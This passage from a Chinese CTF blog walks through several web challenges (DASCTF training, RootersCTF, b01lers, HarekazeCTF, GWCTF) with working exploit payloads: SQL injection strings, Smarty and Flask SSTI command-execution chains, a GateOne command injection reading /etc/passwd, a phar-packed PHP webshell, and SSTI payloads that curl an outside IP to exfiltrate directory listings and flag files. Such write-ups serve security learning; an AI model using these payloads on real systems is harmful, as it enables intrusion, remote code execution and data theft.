        <content type="html"><![CDATA[<p>安恒暑假培训的摸底，记录一下<a id="more"></a></p><h3 id="sql1-0-简单"><a href="#sql1-0-简单" class="headerlink" title="sql1.0[简单]"></a>sql1.0[简单]</h3><img src="/2020/07/07/DAStraining/1.png" class=""><p>打开就是一个这样的登录框，就是sql注入，测试的时候怎么测试都没有反应，只会说记下你的浏览器了</p><p>后面想到可能诸如点在UA中，burp抓包测试一下爆字段，报错了，找到注入点</p><img src="/2020/07/07/DAStraining/2.png" class=""><p>查找一下报错的内容，是insert注入，找到对应的sql注入语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">注数据库</span><br><span class="line">'or updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">database</span>()),<span class="number">0x7e</span>),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'#  '</span>~<span class="keyword">test</span>~<span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注表</span></span><br><span class="line"><span class="string">'</span><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'test'</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'# '</span>~secert,<span class="keyword">user</span><span class="string">'</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">注列</span></span><br><span class="line"><span class="string"> '</span><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'secert'</span>)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'#  '</span>~secert<span class="string">'</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> 注字段值</span></span><br><span class="line"><span class="string">  '</span><span class="keyword">or</span> updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">group_concat</span>(secert) <span class="keyword">from</span>  test.secert)),<span class="number">0</span>) <span class="keyword">or</span><span class="string">'#  ~DASCTF&#123;wfjewhf893uf3ufiwofjoww&#125;</span></span><br></pre></td></tr></table></figure><img src="/2020/07/07/DAStraining/3.png" class=""><h3 id="Dashboard-困难"><a href="#Dashboard-困难" class="headerlink" title="Dashboard[困难]"></a>Dashboard[困难]</h3><p>登录界面，万能密码登录，开始试了很多，发现and,or,空格等很多都被过滤了</p><p>猜测后台sql语句为:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from xxx where username&#x3D;&#39;$username&#39; and password&#x3D;&#39;$passwd&#39;&quot;;</span><br></pre></td></tr></table></figure><p>这里在用户名处可以用反斜杠转义引号，这样就能让$passwd逃逸出来</p><p>admin\  ||1#就能成功登录了</p><p>在Dashboard页面有一个个人信息修改页面，填一下抓个包</p><p>没发现什么有用的信息，但是这个回显很像模板注入，把收集的模板注入的paylaod挨个试试，是smarty模板注入，在name处，这里过滤了挺多，不能命令执行，可能要RCE了，先来试试</p><img src="/2020/07/07/DAStraining/8.png" class=""><p>可以看到flag在根目录下，但是有点问题，不知道怎么读取，感觉跟上次GXY的禁止套娃有点差别，试试构造一下好了</p><p>2333，果然不行</p><p>这里要补充点知识点了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array_slice() 函数在数组中根据条件取出一段值，并返回</span><br><span class="line">get_defined_vars()此函数返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。</span><br><span class="line">array_flip() 函数用于反转/交换数组中的键名和对应关联的键值</span><br><span class="line">array_rand() 函数返回数组中的随机键名</span><br><span class="line">getallheaders()此函数传回现行的请求的所有HTTP标头，传回值是一数组形态</span><br></pre></td></tr></table></figure><p>这样一来就能构造了，array_rand()和array_flip()一起用，这里读取文件内容，带有file的都被ban了，也就是fgets()、readfile()、file_get_contents()、highlight_file()都不能用，不过还有一个show_resource()函数能用，功能类似</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.&#123;if show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))))))&#125;&#123;&#x2F;if&#125;#这个太靠运气了，要刷好多次，我是没有刷出来</span><br><span class="line">2.&#123;if show_source(current(array_slice(scandir(dirname(chdir(dirname(dirname(dirname(getcwd())))))),7)))&#125;&#123;&#x2F;if&#125;#这个就比较好理解了</span><br><span class="line">3.添加头字段a:&#x2F;flag</span><br><span class="line">&#123;if show_source(end(getallheaders()))&#125;&#123;&#x2F;if&#125;#这种也比较好理解，a随便改成什么都可以</span><br></pre></td></tr></table></figure><p>附上一张第二种方法读取的图片</p><img src="/2020/07/07/DAStraining/9.png" class=""><h3 id="NiuShop-简单"><a href="#NiuShop-简单" class="headerlink" title="NiuShop[简单]"></a>NiuShop[简单]</h3><p>页面提示是thinkphp5.0，开始以为要后台登录，admin/admin直接登上了，还特地去找了后台登录getshell的文章，后来发现打不通</p><p>回过来试了一下thinkphp5.0的链子，通了23333</p><p>看一下根目录有哪些文件</p><img src="/2020/07/07/DAStraining/4.png" class=""><p>直接读取flag文件</p><img src="/2020/07/07/DAStraining/5.png" class=""><p>后面要抓紧时间把thinkphp每个版本的链子都过一遍2333</p><h3 id="GateOne-中等"><a href="#GateOne-中等" class="headerlink" title="GateOne[中等]"></a>GateOne[中等]</h3><p>打开题是个类似于xshell的页面，无从下手，从没有遇到过的题目，找找相关的资料吧</p><p>赵总还是tql了，在GitHub上找到了赵总的这篇文章<a href="https://github.com/liftoff/GateOne/issues/736?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://github.com/liftoff/GateOne/issues/736?tdsourcetag=s_pctim_aiomsg</a></p><p>简单的来说就是在登录等待的时候执行terminal：ssh_get_host_fingerprint’命令，buu上开台机子</p><p>直接用文章里的payload打：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GateOne.ws.send(&#39;&#123;&quot;terminal:ssh_get_host_fingerprint&quot;:&#123;&quot;host&quot;:&quot;node3.buuoj.cn&quot;,&quot;port&quot;:&quot;29876;cat &#x2F;etc&#x2F;passwd;&quot;&#125;&#125;&#39;)</span><br></pre></td></tr></table></figure><img src="/2020/07/07/DAStraining/6.png" class=""><p>在页面的报错信息中成功读到了内容，下面直接来读flag吧</p><img src="/2020/07/07/DAStraining/7.png" class=""><h3 id="icms-简单"><a href="#icms-简单" class="headerlink" title="icms[简单]"></a>icms[简单]</h3>]]></content>
      
      
      
        <tags>
            
            <tag> DAS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>taoismt</title>
      <link href="/2020/07/04/taoismt/"/>
      <url>/2020/07/04/taoismt/</url>
      
        <content type="html"><![CDATA[<h3 id="RootersCTF2019-I-♥-Flask"><a href="#RootersCTF2019-I-♥-Flask" class="headerlink" title="[RootersCTF2019]I_ ♥ _Flask"></a>[RootersCTF2019]I_ ♥ _Flask<a id="more"></a></h3><p>根据题目的意思，应该是flask模板注入，找到ssti模板注入的payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">'catch_warnings'</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">'__builtins__'</span>].eval(<span class="string">"__import__('os').popen('id').read()"</span>) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>这里有一篇文章payload很详细：<a href="https://www.cnblogs.com/hackxf/p/10480071.html" target="_blank" rel="noopener">https://www.cnblogs.com/hackxf/p/10480071.html</a></p><p>还有一个问题是没有给传入的参数，这里看了别的师傅的wp，用到了一个工具叫Arjun-master，可以找到传入的参数，get、post、json形式的都可以，readme.md文档里都有说明</p><p>这里找一下</p><img src="/2020/07/04/taoismt/1.png" class=""><p>一把梭赋值给name</p><img src="/2020/07/04/taoismt/2.png" class=""><p>然后把popen里的参数改一下就可以了</p><h3 id="b01lers2020-Life-on-Mars"><a href="#b01lers2020-Life-on-Mars" class="headerlink" title="[b01lers2020]Life on Mars"></a>[b01lers2020]Life on Mars</h3><p>整个网页找遍了也没找到点，扫一发也没发现什么东西</p><p>google的F12有发现</p><img src="/2020/07/04/taoismt/3.png" class=""><p>给了路径和参数，查询一下字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query?search=amazonis_planitia order by 2</span><br><span class="line"><span class="comment">#正常返回json数据，改为3返回2</span></span><br></pre></td></tr></table></figure><p>下面就是常规查数据库名，表名，列名，字段值</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(schema_name),2%20from%20information_schema.schemata</span><br><span class="line"><span class="comment">#["information_schema,alien_code,aliens","2"]</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/query?search=amazonis_planitia%20union%20select%20group_concat(table_name),2%20from%20information_schema.tables%20where%20table_schema=%27alien_code%27</span><br><span class="line"><span class="comment">#["code","2"]]</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(column_name),2%20from%20information_schema.columns%20where%20table_schema=%27alien_code%27</span><br><span class="line"><span class="comment">#["id,code","2"]]</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">query?search=amazonis_planitia%20union%20select%20group_concat(code),2%20from%20alien_code.code</span><br><span class="line"><span class="comment">#["flag&#123;e945022c-5205-409e-8a0c-a8fe4afd6742&#125;","2"]]</span></span><br></pre></td></tr></table></figure><p>这里发现sqlmap一把梭也可以，直接贴图</p><img src="/2020/07/04/taoismt/4.png" class=""><h3 id="HarekazeCTF2019-Avatar-Uploader-1"><a href="#HarekazeCTF2019-Avatar-Uploader-1" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 1"></a>[HarekazeCTF2019]Avatar Uploader 1</h3><p>打开，登录，可以上传文件</p><p>随手上传图片马，只说了上传成功， 鉴于前面题目经验，在前端源码找到了路径，很遗憾，蚁剑连不上，看来不是这样做的</p><p>扫描器扫一扫，也没扫到啥东西，还好，能去GitHub看源码(别的师傅说源码题目是直接给的，然后buu复现可能忘了)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#upload.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'config.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib/util.php'</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'lib/session.php'</span>);</span><br><span class="line"></span><br><span class="line">$session = <span class="keyword">new</span> SecureClientSession(CLIENT_SESSION_ID, SECRET_KEY);</span><br><span class="line"></span><br><span class="line"><span class="comment">// check whether file is uploaded</span></span><br><span class="line"><span class="keyword">if</span> (!file_exists($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]) || !is_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'No file was uploaded.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file size</span></span><br><span class="line"><span class="keyword">if</span> ($_FILES[<span class="string">'file'</span>][<span class="string">'size'</span>] &gt; <span class="number">256000</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file type</span></span><br><span class="line">$finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line">$type = finfo_file($finfo, $_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line">finfo_close($finfo);</span><br><span class="line"><span class="keyword">if</span> (!in_array($type, [<span class="string">'image/png'</span>])) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded file is not PNG format.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check file width/height</span></span><br><span class="line">$size = getimagesize($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>]);</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">0</span>] &gt; <span class="number">256</span> || $size[<span class="number">1</span>] &gt; <span class="number">256</span>) &#123;</span><br><span class="line">  error(<span class="string">'Uploaded image is too large.'</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($size[<span class="number">2</span>] !== IMAGETYPE_PNG) &#123;</span><br><span class="line">  <span class="comment">// I hope this never happens...</span></span><br><span class="line">  error(<span class="string">'What happened...? OK, the flag for part 1 is: &lt;code&gt;'</span> . getenv(<span class="string">'FLAG1'</span>) . <span class="string">'&lt;/code&gt;'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ok</span></span><br><span class="line">$filename = bin2hex(random_bytes(<span class="number">4</span>)) . <span class="string">'.png'</span>;</span><br><span class="line">move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>], UPLOAD_DIR . <span class="string">'/'</span> . $filename);</span><br><span class="line"></span><br><span class="line">$session-&gt;set(<span class="string">'avatar'</span>, $filename);</span><br><span class="line">flash(<span class="string">'info'</span>, <span class="string">'Your avatar has been successfully updated!'</span>);</span><br><span class="line">redirect(<span class="string">'/'</span>);</span><br></pre></td></tr></table></figure><p>判断文件大小，没影响</p><p>判断文件类型，只能是png图片</p><p>判断文件高宽</p><p>用finfo判断文件类型，getimagesize判断文件的宽度和高度，这里又要图片类型不能是PNG</p><p>搜一下资料，破环图片的结构就能够避开getimagesize的检测，就能够让那个不是png类型的判断成立</p><img src="/2020/07/04/taoismt/5.png" class=""><p>上传，成功</p><img src="/2020/07/04/taoismt/6.png" class=""><h3 id="HarekazeCTF2019-Avatar-Uploader-2"><a href="#HarekazeCTF2019-Avatar-Uploader-2" class="headerlink" title="[HarekazeCTF2019]Avatar Uploader 2"></a>[HarekazeCTF2019]Avatar Uploader 2</h3><p>上面的upload.php用完了，这题看另一个考点</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#session.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecureClientSession</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> $cookieName;</span><br><span class="line">  <span class="keyword">private</span> $secret;</span><br><span class="line">  <span class="keyword">private</span> $data;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($cookieName = <span class="string">'session'</span>, $secret = <span class="string">'secret'</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data = [];</span><br><span class="line">    <span class="keyword">$this</span>-&gt;secret = $secret;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (array_key_exists($cookieName, $_COOKIE)) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">list</span>($data, $signature) = explode(<span class="string">'.'</span>, $_COOKIE[$cookieName]);</span><br><span class="line">        $data = urlsafe_base64_decode($data);</span><br><span class="line">        $signature = urlsafe_base64_decode($signature);</span><br><span class="line">    </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;verify($data, $signature)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;data = json_decode($data, <span class="keyword">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125; <span class="keyword">catch</span> (<span class="keyword">Exception</span> $e) &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">$this</span>-&gt;cookieName = $cookieName;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> array_key_exists($key, <span class="keyword">$this</span>-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span><span class="params">($key, $defaultValue = null)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isset($key)) &#123;</span><br><span class="line">      <span class="keyword">return</span> $defaultValue;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;data[$key];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($key, $value)</span></span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;data[$key] = $value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">unset</span><span class="params">($key)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;data[$key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    $json = json_encode(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">    $value = urlsafe_base64_encode($json) . <span class="string">'.'</span> . urlsafe_base64_encode(<span class="keyword">$this</span>-&gt;sign($json));</span><br><span class="line">    setcookie(<span class="keyword">$this</span>-&gt;cookieName, $value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">verify</span><span class="params">($string, $signature)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_verify(<span class="keyword">$this</span>-&gt;secret . $string, $signature);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sign</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> password_hash(<span class="keyword">$this</span>-&gt;secret . $string, PASSWORD_BCRYPT);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>session生成方法如代码所示，cookie通过.分割为两部分，再进行base64解码，然后再判断 明文data和经过加密的值是否匹配。</p><p>第一次构造出一个超过72字符的明文data，无论加什么字符再后面把它拼回去，都能和经过加密的值匹配上</p><img src="/2020/07/04/taoismt/25.png" class=""><p>可以看到index.php这里存在文件包含，可以用触发phar协议</p><p>在session的get方法中传入的key是 theme ，那么也就是说控制了 data[‘theme’] 就可以控制任意文件包含。可以上传一个phar文件包含一个插有恶意代码的css文件。就可以实现rce</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$png_header = hex2bin(<span class="string">'89504e470d0a1a0a0000000d49484452000000400000004000'</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> Phar(<span class="string">'exp.phar'</span>);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(<span class="string">'exp.css'</span>, <span class="string">'&lt;?php system($_GET["cmd"]); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;setStub($png_header . <span class="string">'&lt;?php __HALT_COMPILER(); ?&gt;'</span>);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br></pre></td></tr></table></figure><p>上传之后记下session，解密之后，在添加theme，vaule为文件的路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$edata = <span class="string">'&#123;"name":"admin","avatar":"dc264ad5.png","flash":&#123;"type":"info","message":"Your avatar has been successfully updated!"&#125;,"theme":"phar://uploads/e703149f.png/exp"&#125;'</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">urlsafe_base64_encode</span><span class="params">($data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> rtrim(str_replace([<span class="string">'+'</span>,<span class="string">'/'</span>],[<span class="string">'-'</span>,<span class="string">'_'</span>],base64_encode($data)),<span class="string">'='</span>);</span><br><span class="line">&#125;</span><br><span class="line">var_dump(urlsafe_base64_encode($edata));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>替换掉cookie，就能rce了</p><img src="/2020/07/04/taoismt/26.png" class=""><h3 id="GWCTF-2019-你的名字"><a href="#GWCTF-2019-你的名字" class="headerlink" title="[GWCTF 2019]你的名字"></a>[GWCTF 2019]你的名字</h3><p>界面就一个输入框，以为会是SQL注入，if没有被打印出来，但是其他怎么测试都只会打印出输入的内容</p><p>扫描，也没有什么发现</p><p>到这里，想到尝试一下SSTI模板注入说不定会有所发现，前面的if被过滤了，加上早上刚做了python 的flask的ssti，就先试试，发现os，if，class等都被过滤了，后面的测试就要用字典fuzz了</p><p>参考了师傅的wp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">blacklist = [<span class="string">'import'</span>, <span class="string">'getattr'</span>, <span class="string">'os'</span>, <span class="string">'class'</span>, <span class="string">'subclasses'</span>, <span class="string">'mro'</span>, <span class="string">'request'</span>, <span class="string">'args'</span>, <span class="string">'eval'</span>, <span class="string">'if'</span>, <span class="string">'for'</span>,</span><br><span class="line">                 <span class="string">' subprocess'</span>, <span class="string">'file'</span>, <span class="string">'open'</span>, <span class="string">'popen'</span>, <span class="string">'builtins'</span>, <span class="string">'compile'</span>, <span class="string">'execfile'</span>, <span class="string">'from_pyfile'</span>, <span class="string">'local'</span>,</span><br><span class="line">                 <span class="string">'self'</span>, <span class="string">'item'</span>, <span class="string">'getitem'</span>, <span class="string">'getattribute'</span>, <span class="string">'func_globals'</span>, <span class="string">'config'</span>]</span><br><span class="line"><span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">if</span> no <span class="keyword">in</span> s:</span><br><span class="line">            s = s.replace(no, <span class="string">''</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">return</span> s</span><br></pre></td></tr></table></figure><p>这里用最后的config来进行绕过过滤，因为在过滤的黑盒中它是最后一个，检测了config之后也就结束过滤了</p><p>这里由于还过滤了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#125;&#125;</span><br></pre></td></tr></table></figure><p>没有碰到过这种情况，在先知社区找到了一篇深入学习SSTI注入的文章，这里给了payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;% <span class="keyword">if</span> <span class="string">''</span>.__class__.__mro__[<span class="number">2</span>].__subclasses__()[<span class="number">59</span>].__init__.func_globals.linecache.os.popen(<span class="string">'curl http://xx.xxx.xx.xx:8080/?i=`whoami`'</span>).read()==<span class="string">'p'</span> %&#125;<span class="number">1</span>&#123;% endif %&#125;</span><br><span class="line"><span class="comment">#相当于把命令执行的结果外带，这就要反弹shell了</span></span><br></pre></td></tr></table></figure><p>这里把payload改改就能用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(<span class="string">'curl http://174.2.11.217:8888/ -d `ls/|base64`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br><span class="line"><span class="comment">#buu开一台内网机子监听端口就能得到返回的内容，这里不用base64只能回显一个app不知道是什么原因</span></span><br><span class="line">app</span><br><span class="line">bin</span><br><span class="line">boot</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">flag_1s_Hera</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">media</span><br><span class="line">mn</span><br></pre></td></tr></table></figure><p>下面直接读取flag文件即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% iconfigf <span class="string">''</span>.__claconfigss__.__mconfigro__[<span class="number">2</span>].__subclaconfigsses__()[<span class="number">59</span>].__init__.func_glconfigobals.lineconfigcache.oconfigs.popconfigen(<span class="string">'curl http://174.2.11.217:8888/ -d `cat /flag_1s_Hera`;'</span>) %&#125;<span class="number">1</span>&#123;% endiconfigf %&#125;</span><br></pre></td></tr></table></figure><img src="/2020/07/04/taoismt/7.png" class=""><h3 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019]Pickle Store"></a>[watevrCTF-2019]Pickle 